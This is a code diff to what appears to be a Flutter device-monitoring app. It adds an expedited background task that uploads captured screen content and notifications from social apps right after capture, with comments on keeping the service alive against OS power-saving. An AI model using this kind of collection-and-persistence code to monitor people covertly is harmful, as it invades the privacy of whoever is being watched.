@@ -1,9 +1,19 @@
 import 'dart:ui';
 
 import 'package:flutter/widgets.dart';
+import 'package:flutter_riverpod/flutter_riverpod.dart';
 import 'package:workmanager/workmanager.dart';
 
+import '../../core/config/env_config.dart';
+import '../../features/social_accessibility/viewmodel/screen_capture_sync_service.dart';
+import '../../features/social_notifications/viewmodel/notification_sync_service.dart';
 import 'service_watchdog.dart';
+
+/// FEATURE A task name. The native capture services enqueue an expedited
+/// WorkManager job carrying this name (see `ExpeditedUpload.kt`); the dispatcher
+/// below routes it to an immediate social-queue drain + upload. Keep the string
+/// byte-for-byte in sync with the Kotlin `DART_TASK` constant.
+const String expeditedSocialUploadTask = 'vigilExpeditedSocialUpload';
 
 /// OS-level ("out-of-process") keep-alive for the monitoring service.
 ///
@@ -94,13 +104,44 @@ void _workManagerCallbackDispatcher() {
     DartPluginRegistrant.ensureInitialized();
 
     try {
+      if (taskName == expeditedSocialUploadTask) {
+        // FEATURE A: a native capture just wrote a new social line — drain and
+        // POST it now, in this short-lived isolate, without waiting for the
+        // polling background isolate (which the OS freezes in Doze).
+        await _runExpeditedSocialUpload();
+        return true;
+      }
+
       debugPrint('[WorkManagerService] ⏰ Keep-alive fired ($taskName) — checking service health');
       await ServiceWatchdog.ensureServiceHealthy();
       return true;
     } catch (e, st) {
-      debugPrint('[WorkManagerService] ❌ Keep-alive task failed: $e\n$st');
+      debugPrint('[WorkManagerService] ❌ Task "$taskName" failed: $e\n$st');
       // Returning false asks WorkManager to retry with the backoff policy.
       return false;
     }
   });
+}
+
+/// Drains + uploads the social queues (screen capture + notifications) from the
+/// expedited WorkManager isolate.
+///
+/// Safe to run alongside the polling background isolate: both drain via atomic
+/// file rename (`SocialQueueFile.drain`), so only one side ever claims a given
+/// batch — and neither touches the concurrency-sensitive `call_log` / `sms`
+/// plugins, so no leader election is needed here. This isolate has no shared
+/// Riverpod/dotenv state, so env is loaded and a local container is built, then
+/// disposed.
+Future<void> _runExpeditedSocialUpload() async {
+  debugPrint('[Expedited] 🚀 social upload task fired');
+  await EnvConfig.load();
+  final container = ProviderContainer();
+  try {
+    final screenSync = container.read(screenCaptureSyncServiceProvider);
+    final notifSync = container.read(notificationSyncServiceProvider);
+    await Future.wait([screenSync.sync(), notifSync.sync()]);
+    debugPrint('[Expedited] ✓ social drain complete');
+  } finally {
+    container.dispose();
+  }
 }
